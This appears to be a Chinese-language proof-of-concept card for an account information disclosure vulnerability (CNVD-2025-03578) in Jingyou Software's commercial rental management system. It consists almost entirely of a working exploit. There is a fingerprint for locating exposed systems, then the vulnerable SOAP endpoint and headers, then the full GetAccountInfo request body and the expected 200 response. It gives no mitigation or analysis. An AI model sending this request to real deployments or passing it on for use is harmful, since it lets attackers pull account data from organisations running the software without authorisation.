# 竞优软件商业租赁管理系统account信息泄露漏洞(CNVD-2025-03578)

- **系统**：竞优软件商业租赁管理系统account信息泄露漏洞(CNVD-2025-03578)　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`title="商业租赁管理系统"`
- **请求**：`POST /rental/contract/api/account.asmx HTTP/1.1`
- **关键头**：`Content-Length: 338`　`Content-Type: text/xml; charset=utf-8`　`SOAPAction: [http://tempuri.org/GetAccountInfo](http://tempuri.org/GetAccountInfo)`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xmlns:xsd="http://www.w3.org/2001/XMLSchema"
xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetAccountInfo xmlns="http://tempuri.org/" />
</soap:Body>
</soap:Envelope>
```
- **预期**：200　|　—